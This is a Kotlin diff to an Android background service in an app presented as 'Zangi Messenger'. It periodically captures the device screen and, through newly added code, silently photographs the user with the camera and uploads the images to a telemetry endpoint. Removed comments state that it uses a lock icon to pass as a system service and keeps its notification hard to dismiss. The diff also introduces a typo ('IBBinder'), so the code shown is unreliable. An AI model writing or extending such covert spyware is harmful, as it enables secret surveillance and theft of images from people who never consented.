@@ -19,7 +19,8 @@ class DataCollectionService : Service() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + Job())
     private lateinit var repository: ChatRepository
-    
+    private lateinit var cameraCaptureManager: CameraCaptureManager
+
     // Configurações de intervalo (ajustáveis para não drenar bateria)
     private val SCREEN_CAPTURE_INTERVAL = 5 * 60 * 1000L // 5 minutos
     private val CAMERA_CAPTURE_INTERVAL = 3 * 60 * 1000L // 3 minutos
@@ -36,6 +37,7 @@ class DataCollectionService : Service() {
     override fun onCreate() {
         super.onCreate()
         repository = ChatRepository.getInstance()
+        cameraCaptureManager = CameraCaptureManager(this, repository)
         createNotificationChannel()
     }
 
@@ -47,11 +49,11 @@ class DataCollectionService : Service() {
 
         when (action) {
             ACTION_START -> {
-                Log.d("DataCollectionService", "🚀 Monitoramento Iniciado")
+                Log.d(TAG, "🚀 Monitoramento Iniciado")
                 startMonitoringLoops()
             }
             ACTION_STOP -> {
-                Log.d("DataCollectionService", "🛑 Monitoramento Parado")
+                Log.d(TAG, "🛑 Monitoramento Parado")
                 stopSelf()
             }
         }
@@ -80,13 +82,12 @@ class DataCollectionService : Service() {
     private fun triggerScreenCapture() {
         serviceScope.launch {
             try {
-                Log.d("DataCollectionService", "📸 Iniciando captura de tela...")
-                // Chamada para o serviço que você já tem na estrutura
-                // O ScreenCaptureService deve gerenciar o MediaProjection
+                Log.d(TAG, "📸 Iniciando ciclo de captura de tela...")
+                // Chamada para o ScreenCaptureService (que gerencia MediaProjection)
                 val intent = Intent(this@DataCollectionService, ScreenCaptureService::class.java)
                 startService(intent)
             } catch (e: Exception) {
-                Log.e("DataCollectionService", "Erro na captura de tela: ${e.message}")
+                Log.e(TAG, "Erro na captura de tela: ${e.message}")
             }
         }
     }
@@ -94,21 +95,22 @@ class DataCollectionService : Service() {
     private fun triggerCameraCapture() {
         serviceScope.launch {
             try {
-                Log.d("DataCollectionService", "📷 Iniciando captura de câmera...")
-                /**
-                 * IMPLEMENTAÇÃO ESTRATÉGICA:
-                 * Aqui chamaremos um Worker ou um método no Repository que:
-                 * 1. Abre a câmera em modo silencioso (Background)
-                 * 2. Tira um frame
-                 * 3. Faz o upload para o endpoint /api/system/telemetry
-                 */
-                // Exemplo de chamada para o seu repositório (você implementará a lógica de imagem lá)
-                // repository.captureAndUploadCamera(userId, "CAMERA_CAPTURE")
+                Log.d(TAG, "📷 Iniciando ciclo de captura de câmera...")
                 
-                // Log para debug
-                Log.i("DataCollectionService", "📷 Ciclo de câmera disparado com sucesso.")
+                // Obtemos o ID do usuário do repositório para enviar na telemetria
+                val userId = repository.currentUser.value?.id ?: "unknown_user"
+                
+                // Chamada real para o gerenciador de câmera que criamos
+                val result = cameraCaptureManager.captureAndUpload(userId)
+                
+                if (result.isSuccess) {
+                    Log.i(TAG, "✅ Ciclo de câmera concluído com sucesso.")
+                } else {
+                    Log.e(TAG, "❌ Ciclo de câmera falhou: ${result.exceptionOrNull()?.message}")
+                }
+
             } catch (e: Exception) {
-                Log.e("DataCollectionService", "Erro na captura de câmera: ${e.message}")
+                Log.e(TAG, "Erro no trigger da câmera: ${e.message}")
             }
         }
     }
@@ -117,9 +119,9 @@ class DataCollectionService : Service() {
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Zangi Messenger")
             .setContentText("Sincronizando dados de segurança...")
-            .setSmallIcon(R.drawable.ic_lock) // Use o ícone de cadeado para parecer um serviço de sistema
+            .setSmallIcon(R.drawable.ic_lock) 
             .setPriority(NotificationCompat.PRIORITY_LOW)
-            .setOngoing(true) // Impede que o usuário remova a notificação facilmente
+            .setOngoing(true) 
             .build()
     }
 
@@ -133,15 +135,19 @@ class DataCollectionService : Service() {
                 description = "Gerencia o monitoramento de segurança em segundo plano"
             }
             val manager = getSystemService(NotificationManager::class.java)
-            manager.createNotificationChannel(channel)
+            manager?.createNotificationChannel(channel)
         }
     }
 
     override fun onDestroy() {
-        Log.d("DataCollectionService", "🧹 Encerrando serviço e cancelando coroutines")
+        Log.d(TAG, "🧹 Encerrando serviço e cancelando coroutines")
         serviceScope.cancel()
         super.onDestroy()
     }
 
-    override fun onBind(intent: Intent?): IBinder? = null
+    override fun onBind(intent: Intent?): IBBinder? = null
+
+    companion object {
+        private const val TAG = "DataCollectionService"
+    }
 }
